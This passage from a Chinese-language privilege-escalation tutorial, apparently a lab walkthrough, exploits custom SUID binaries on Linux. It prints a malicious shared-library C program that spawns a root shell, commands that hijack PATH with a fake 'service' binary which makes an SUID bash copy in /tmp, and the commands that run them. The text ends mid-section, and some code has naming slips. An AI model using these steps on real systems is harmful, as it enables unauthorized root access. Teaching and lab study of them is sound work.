<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strace /usr/local/bin/suid-so 2&gt;&amp;1 | less</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630648-714017991-aaf5ee52a793f892e37265122583de7b.png" width="926" height="351" class="img_ev3q"></p>
<p>基本上，在调试程序时我们要查找两件事：哪些共享库正在加载，以及它们是从哪里被加载。</p>
<p>其实，程序是否能找到共享对象并不重要，最重要的是，找到的共享对象它所在的目录我们是否有写入权限。</p>
<p>现在知道了我们真正要寻找的目的，那我们就可以改进这条命令，用 grep 命令查找从非默认位置执行的任何 .so 文件。</p>
<blockquote>
<p>目录：  <strong>/lib、/usr/lib、/usr/local/lib</strong> 是存储共享库的默认位置。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strace /usr/bin/suid-so 2&gt;&amp;1 | grep -v &#x27;/lib/\|/usr/\|/etc/&#x27; | grep -i &#x27;\.so&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629716-949439301-1a61f8381a0b0541a388e8cc31473d8b.png" width="842" height="45" class="img_ev3q"></p>
<p>与使用 <strong>strings</strong> 命令类似，我们找到了从当前用户主目录执行的 <strong>libcalc.so</strong> 文件。</p>
<p>这也证实了共享对象文件就是在执行过程中被加载的，这意味着它是可利用的。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32制作恶意共享对象文件"><strong><div id="id3.2">3.2、制作恶意共享对象文件</div></strong><a href="#32制作恶意共享对象文件" class="hash-link" aria-label="32制作恶意共享对象文件的直接链接" title="32制作恶意共享对象文件的直接链接">​</a></h4>
<p>至此，我们已经确认有一个共享库是从一个非标准目录加载的，而这个目录恰好是我们当前的用户主目录，而我们在主目录中是拥有写入权限的。</p>
<p>综上所述，剩下唯一要做的就是制作一个名为 <strong>licalc.so</strong> 的恶意共享对象文件，并将其放置在 <strong>/home/user/.config</strong> 目录中。</p>
<p>导航到 <strong>/home/user/.config</strong> ，我们可以看到该目录中没有<strong>libcal.so文件。</strong></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629790-1683173235-63ce73dd58be6af5584708965c805f85.png" width="432" height="127" class="img_ev3q"></p>
<p>由于 <strong>libcalc.so</strong> 文件不存在，我们需要创建它。</p>
<p>为此，我们将创建一个恶意 C 程序，然后将其编译为共享目标文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;stdio.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;stdlib.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">static void inject() __attribute__((constructor));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void _inject() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        system(&quot;/bin/bash -p&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于 <strong>suid-so</strong> 二进制文件由 root 拥有并设置了 SUID 位，因此当它执行时，我们的恶意共享对象文件将由程序加载并以 root 身份执行。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629529-1805110007-e92dfafc191f20eecf4cd3783e37793e.png" width="418" height="176" class="img_ev3q"></p>
<p>接下来，我们需要将C程序编译成共享目标文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc -shared -fPIC libcalc.c -o /home/user/.config/libcalc.so</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629270-1577131696-3b42f5fef3c5641856b38e1d7c476ef3.png" width="628" height="109" class="img_ev3q"></p>
<p>Perfect，我们的 libcalc.so 恶意副本已创建并可供使用。</p>
<p>现在我们要做的就是运行 suid-so 二进制文件。执行后，它将加载 lcalc 共享库。加载完成后，它将执行恶意版本的 libcalc.so，并将我们直接拖入 root shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/suid-so</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629867-1871442645-182b8074eb40f18e6c268a80d3533283.png" width="421" height="95" class="img_ev3q"></p>
<p>在这里，可以看到程序开始正常运行，接着恶意共享对象被加载，然后我们就进入了一个 root shell 环境！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4利用-suid-二进制文件--path-注入"><strong><div id="id4">4、利用 SUID 二进制文件 – PATH 注入</div></strong><a href="#4利用-suid-二进制文件--path-注入" class="hash-link" aria-label="4利用-suid-二进制文件--path-注入的直接链接" title="4利用-suid-二进制文件--path-注入的直接链接">​</a></h2>
<p>继续讨论自定义 SUID 二进制文件的第二个示例，我们将查看在枚举过程中找到的 <strong>suid-path</strong> 二进制文件。</p>
<p>正如我们在上一个示例中看到的那样，当面对我们不熟悉的二进制文件时，我们要做的第一件事就是运行它以查看它的作用。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/suid-path</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629834-143258181-8616f34c9133ac69ab5ef22a5daa4516.png" width="686" height="229" class="img_ev3q"></p>
<p>有趣的是，在这里我们可以看到二进制文件似乎正在检查 SSH 服务的状态。</p>
<p>现在我们已经了解了二进制文件正在做什么，下一步是检查 GTFObins 以“快速获胜”。</p>
<p>但是，我们已经知道这是一个自定义二进制文件，GTFObins 是不会列出它的。</p>
<p>接下来，我们要做的就是尝试从二进制文件中提取字符串。这可以帮助我们确定在执行过程中是否加载了任何有趣的二进制文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">strings /usr/bin/suid-path</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630768-767127405-49e372338584e78bd93d9dd9c0a5a071.png" width="440" height="476" class="img_ev3q"></p>
<p>Amazing！在字符串中，我们可以看到二进制文件中使用了命令 <strong>service ssh status</strong>。</p>
<p>之前运行 suid-path 二进制文件时，我们注意到它会检查 SSH 服务的状态，现在我们知道了输出的来源指令。</p>
<p>关于命令 <strong>service ssh status</strong> 需要注意的一件事是：service 二进制文件没有使用绝对路径。</p>
<p>这就为 PATH 注入漏洞打开了大门。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41设置漏洞并获取-root-shell"><strong><div id="id4.1">4.1、设置漏洞并获取 Root Shell</div></strong><a href="#41设置漏洞并获取-root-shell" class="hash-link" aria-label="41设置漏洞并获取-root-shell的直接链接" title="41设置漏洞并获取-root-shell的直接链接">​</a></h4>
<p>现在我们已经发现了这个漏洞，接下来需要做一些事情来设置我们的漏洞。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="411编辑-path-环境变量"><strong><div id="id4.1.1">4.1.1、编辑 PATH 环境变量</div></strong><a href="#411编辑-path-环境变量" class="hash-link" aria-label="411编辑-path-环境变量的直接链接" title="411编辑-path-环境变量的直接链接">​</a></h6>
<p>我们需要做的第一件事是编辑 PATH 变量以包含可写目录。</p>
<blockquote>
<p>PATH 环境变量是 Linux 在执行命令时用于搜索二进制文件的有序路径列表。仅当执行命令而不指定二进制文件的绝对路径时，才使用 PATH。</p>
</blockquote>
<p>目前，我们的 PATH 列出了默认目录，我们可以使用以下命令查看这些目录：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo $PATH</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629593-1977858852-efa464fd0f0362f32b7f3762b591362a.png" width="807" height="50" class="img_ev3q"></p>
<p>当命令 <strong>service ssh status</strong> 由 <strong>suid-path</strong> 二进制文件执行时，它是在不使用绝对路径的情况下完成的。这意味着系统将从左到右检查 PATH 环境变量中列出的每个目录中是否有 <strong>service</strong> 二进制文件，然后从找到的第一个目录执行它。</p>
<p>现在我们知道 PATH 环境变量是如何工作的，我们应该开始考虑如何使用这些知识来利用命令 <strong>service ssh status</strong>。</p>
<p>上述 PATH 中的所有默认目录对于标准用户来说都是不可写的，这意味着我们需要添加一个新的目录。</p>
<p>任何用户都可以编辑自己的 PATH。并且，添加到用户 PATH 的任何新目录都会放置在最左侧。</p>
<p>例如，我们可以将一个可写目录添加到我们的 PATH 中，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">export PATH=/tmp:$PATH</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在，当我们再次检查 PATH 变量时，我们可以看到 <strong>/tmp</strong> 位于最左侧。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629893-1037337066-e96af5c788d11a06287d9525e5f305cb.png" width="846" height="63" class="img_ev3q"></p>
<p>这意味着在没有二进制文件绝对路径的情况下执行的任何命令都将首先检查 <strong>/tmp</strong>。</p>
<p>现在我们需要做的就是制作一个名为 <strong>service</strong> 的恶意二进制文件并将其放置在 /tmp 目录中。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="412直接针对受害者制造漏洞"><strong><div id="id4.1.2">4.1.2、直接针对受害者制造漏洞</div></strong><a href="#412直接针对受害者制造漏洞" class="hash-link" aria-label="412直接针对受害者制造漏洞的直接链接" title="412直接针对受害者制造漏洞的直接链接">​</a></h6>
<p>从上一个示例中我们知道 <strong>gcc</strong> 已安装在受害者上，因此我们可以直接在受害者上制作漏洞利用程序，然后对其进行编译。</p>
<p>首先，我们需要导航到 /tmp 文件夹，然后运行以下命令来制作恶意 C 程序：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;#include &lt;stdio.h&gt;&#x27; &gt; service.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;#include &lt;stdlib.h&gt;&#x27; &gt;&gt; service.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&#x27; &gt;&gt; service.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;int main(){&#x27; &gt;&gt; service.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;    system(&quot;cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash&quot;);&#x27; &gt;&gt; service.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;  return 0;&#x27; &gt;&gt; service.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;}&#x27; &gt;&gt; service.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629952-1803673719-b08b27bf64e4a5519fe51ab21bd3b19d.png" width="848" height="269" class="img_ev3q"></p>
<p>我们的恶意 C 程序看起来不错，现在需要做的就是编译它，然后再次运行 <strong>suid-path</strong> 程序。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gcc /tmp/service.c -o /tmp/service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629172-1275538852-160d41419ce4202d199252ecc35f70c3.png" width="526" height="60" class="img_ev3q"></p>
<p>Perfect！我们的漏洞已经准备好了。现在，当我们执行 <strong>suid-path</strong> 时，程序将沿着 PATH 查找 <strong>service</strong> 命令。</p>
<p>因为我们将 <strong>/tmp</strong> 添加到我们的 PATH 中，所以程序将首先在 <strong>/tmp</strong> 目录中搜索并执行我们的恶意版本的 <strong>service</strong>。</p>
<p>执行后，我们的恶意 service 二进制文件会将 /bin/bash 复制到 /tmp 中，然后向其添加 SUID 位。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="413利用-suid-path-获取-root-shell"><strong><div id="id4.1.3">4.1.3、利用 suid-path 获取 Root Shell</div></strong><a href="#413利用-suid-path-获取-root-shell" class="hash-link" aria-label="413利用-suid-path-获取-root-shell的直接链接" title="413利用-suid-path-获取-root-shell的直接链接">​</a></h6>
<p>现在到了关键时刻。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/suid-path</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629657-552126071-8e77e0416eaeadd1fa254392a4a68636.png" width="620" height="141" class="img_ev3q"></p>
<p>Boom！我们劫持了执行路径，并让 <strong>suid-path</strong> 程序执行我们的漏洞利用程序，而不是真正的 service 二进制文件。</p>
<p>现在，在 /tmp 目录中出现了添加 SUID 位的 bash 副本，我们可以轻松地进入 root shell 了。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/bash -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629587-1908066832-ed5f4ae8f308f1c46e70e505c9f98946.png" width="674" height="76" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5利用-suid-二进制文件--滥用-shell-功能"><strong><div id="id5">5、利用 SUID 二进制文件 – 滥用 Shell 功能</div></strong><a href="#5利用-suid-二进制文件--滥用-shell-功能" class="hash-link" aria-label="5利用-suid-二进制文件--滥用-shell-功能的直接链接" title="5利用-suid-二进制文件--滥用-shell-功能的直接链接">​</a></h2>
<p>这个例子与前两个例子有些不同，因为这个例子在一定程度上需要利用链。</p>
<p>让我们看一下第三个自定义二进制文件：<strong>suid-sf</strong></p>
<p>首先，我们将运行程序看看它能做些什么，这将帮助我们建立对自定义二进制文件的第一印象。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/suid-sf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXAAAAAsCAIAAADzQHRQAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAABceSURBVHhe7Zz5XxPX3sf767Pce7sqrXiptODS2uqt7ApWKy6QDVkKCoJYtAIVoeBV1CooCFZBEa5oXagLKGAVrahkhoRANrJMEiBk/Vee55zMJCRnMllkEzvn9f5hXme+c86B1/l8cs7k5PtOf3//O2xhC1vYMu1y79496ootbGELW2as2C0EA2pja5UoiY9v3iMpOyPjcoXxZYRSax8TGhpODHOz8Tgulpgj3ltL9MvIR2zKXk3ZQdFGPhabhnMPKZp7zZOEfaJTvp4jjEp1wJM041Twi2ZJIqjnYPxflPuyh5u71dk8/ECHeeShprxE9K0AixXgqcXy8z2wER/jsagnrx4VbxYIo529JO5XPVMy1wc3Trv21kh8qjD+MKHW2nUdUnjt6Ff3TFuyD0/g48l7R45e17ecGEqtIGRwPAzjJFt7rDlYiK/nYgmZ4vxavUxjt4BbXtFYX7Yr9uTjCaCFLFF+DfFKMTWeHeWKg3vxeD7OK1c/kjjiVcbWSlESD9+cJymrlXE5wvhDhFJj194ciU+BY1Br7LrbUnjtqCd78TIehnZgPGEf7zwSFxIaXfx4jBwkmA8XLL/+j/nXHTYD/W8B8betHavNDX8zN3xsuZ5rI+S2+4vNdZFWudB68x/ma8ds6nJL/X+b7zTbx89Y6v/LXLfccnutueFd8+VvrRKhoxGV/F5FdkLEpx+/++4HIau/3XXxudTm0Qsd2UDznuSvloQsWhyxJrHgXKceVFq1luGWks2r1yVu4nAzKgvjP+ZfmLDCepZpQlkJWaiJPh/YCNEkhlmMWuujWlEsmLj5ykcOzQSB1oL3GLoeGEfBNCLsk7Kxf+cBk8KrupnqbVPPzguuSR8gyOMukLC5gd6v2v5qs7nub5Y/umi3AMGMkzSU+o1WL8YEMd3O/GJX6yStPiBoGoAw1bMECWUlZHGbo/OIxip9OakYpdX7RWu+UopFcwd/uEB03NX/1qpI3ymM3jncijHUO9cd84bnRPcP8rgLJGweUdlVd2zj3l2Aif975x2WNx/EOJigrIQstJm60Bgb0FWXiZPTsRiwxskYTCtTNP9hNjHXI4/PNai0/IE87gIJW2AgE5flzQQxDiYoKyELbaayzCqotPyBPO4CCVtgUPOVVj/r0MTA4hXWUBYKtCnuh+k8++bCGsobDmsoCwXaFH/b8foyNQBDkb+8fWVAG9yrmYCgZCB/2XFlgNC4VDHTzHb7swtrKAsF2vwOlol+XV2dsuryuG4WxDYL